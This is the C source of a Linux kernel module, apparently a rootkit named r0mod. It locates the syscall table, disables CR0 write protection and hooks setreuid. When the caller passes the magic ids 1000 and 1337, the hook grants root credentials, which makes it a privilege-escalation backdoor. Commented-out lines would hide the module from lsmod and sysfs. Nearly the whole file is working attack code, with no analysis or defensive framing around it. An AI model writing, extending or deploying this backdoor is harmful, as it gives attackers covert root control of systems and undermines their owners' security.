#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/cred.h>
#include <linux/unistd.h>   // syscalls
#include <linux/syscalls.h> // syscalls
#include <linux/capability.h>

#include <asm/paravirt.h>   // write_cr0

#include <r0mod/global.h>

#define SEARCH_START    PAGE_OFFSET
#define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff

unsigned long *sct;
unsigned long *ia32_sct;

struct
{
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct
{
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1337))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
{
    char *p;

    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
    {
        if(memcmp(p, needle, needle_size) == 0)
            return (void *)p;
    }

    return NULL;
}

#if defined(__i386__)
// Phrack #58 0x07; sd, devik
unsigned long *find_sct(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    if ( p )
        return *(unsigned long **)((char *)p + 3);
    else
        return NULL;
}
#elif defined(__x86_64__)
// http://bbs.chinaunix.net/thread-2143235-1-1.html
unsigned long *find_sct(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

// Obtain sys_call_table on amd64; pouik
unsigned long *find_ia32_sct(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}
#endif

unsigned long *locate_sct_by_addr_scan(void)
{
    unsigned long i;

    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
    {
        unsigned long *sct = (unsigned long *)i;

        if(sct[__NR_close] == (unsigned long)sys_close)
        {
            printk("sct found @ %lx\n", (unsigned long)sct);
            return sct;
        }
    }

    return NULL;
}

static int __init r0mod_init(void)
{
    printk("Module starting...\n");

    //printk("Hiding module object.\n");
    //list_del_init(&__this_module.list);               // Remove from lsmod
    //kobject_del(&THIS_MODULE->mkobj.kobj);            // Remove from FS?
    //kobject_del(&THIS_MODULE->holders_dir->parent);   // Remove from FS?

    printk("Search Start: %lx\n", SEARCH_START);
    printk("Search End:   %lx\n", SEARCH_END);

#if defined(__x86_64__)
    if((ia32_sct = (void *)find_ia32_sct()) == NULL)
        printk("ia32_sct == NULL");
#endif

    if((sct = (void *)find_sct()) == NULL)
        printk("sct == NULL\n");

#if defined(__x86_64__)
    if(sct == NULL && ia32_sct == NULL)
#else
    if(sct == NULL)
#endif
        return -1;

    printk("sct hooked @ %lx\n", (unsigned long)sct);

    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)sct[__NR_setreuid];
    sct[__NR_setreuid] = (unsigned long)new_setreuid;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...\n");

    if(sct != NULL)
    {
        write_cr0(read_cr0() & (~0x10000));

        sct[__NR_setreuid] = (unsigned long)orig_setreuid;

        write_cr0(read_cr0() | 0x10000);
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
